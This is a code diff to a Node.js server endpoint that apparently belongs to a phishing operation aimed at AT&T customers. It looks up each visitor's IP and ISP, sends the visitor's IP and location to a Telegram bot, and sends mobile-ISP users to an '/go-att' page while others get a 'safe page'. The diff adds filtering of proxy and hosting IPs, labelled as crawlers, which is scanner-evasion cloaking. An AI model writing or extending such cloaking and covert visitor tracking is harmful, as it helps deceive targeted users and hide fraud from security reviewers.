@@ -181,37 +181,45 @@ app.get('/init', async (req, res) => {
         console.error('[Init] ISP lookup failed:', error.message);
     }
 
-    // Send Telegram Notification
-    let message = `🚀 *New App Visit!* \n\n`;
-    if (data && data.status === 'success') {
-        message += `📍 *IP:* ${data.query}\n` +
-                   `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
-                   `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
-    } else {
-        message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
+    // Security: Filter out proxies, VPNs, and Hosting providers (crawlers often use these)
+    const isSuspicious = data && (data.proxy || data.hosting);
+    if (isSuspicious) {
+        console.log(`[Init] suspicious activity detected: proxy=${data.proxy}, hosting=${data.hosting}`);
     }
-    message += `🕒 *Time:* ${new Date().toLocaleString()}`;
 
-    try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-    } catch (e) {}
+    // Send Telegram Notification (only for real users, not suspicious ones)
+    if (!isSuspicious) {
+        let message = `🚀 *New App Visit!* \n\n`;
+        if (data && data.status === 'success') {
+            message += `📍 *IP:* ${data.query}\n` +
+                       `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
+                       `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
+        } else {
+            message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
+        }
+        message += `🕒 *Time:* ${new Date().toLocaleString()}`;
+
+        try {
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            });
+        } catch (e) {}
+    }
 
     // Determine Redirect URL
     let targetUrl = NON_ATT_LANDING_PAGE;
     if (data && data.status === 'success') {
         const userISP = (data.isp || data.org || "").toUpperCase();
         if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
-            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
+            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page. (Suspicious: ${isSuspicious})`);
             targetUrl = '/go-att';
         } else {
             console.log(`[Init] No ISP match for: ${userISP}`);
         }
     } else {
-        console.log(`[Init] Redirecting to safe page. Status: ${data?.status}`);
+        console.log(`[Init] Redirecting to safe page. Status: ${data?.status}, Suspicious: ${isSuspicious}`);
     }
 
     res.json({ redirect: targetUrl });
